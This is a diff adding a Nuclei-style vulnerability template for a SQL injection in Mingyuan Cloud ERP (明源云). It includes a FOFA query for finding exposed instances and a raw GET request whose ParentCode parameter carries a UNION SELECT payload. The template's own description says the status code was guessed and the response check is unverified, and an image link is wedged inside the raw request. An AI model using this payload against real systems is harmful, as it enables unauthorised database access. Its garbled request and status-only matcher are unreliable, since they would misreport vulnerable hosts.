@@ -1,0 +1,29 @@
+id: poc-iaf40bdau953o8rb
+info:
+  name: 明源云erp某接口存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iaf40bdau953o8rb
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iaf40bdau953o8rb
+    fofa: app=”明源云-ERP”
+http:
+- raw:
+  - 'GET /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1''+union+select+user--+z HTTP/2
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Accept-Encoding: gzip, deflate
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1715329424705-3319821e-2033-4933-a214-9d41de1e1e4c.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
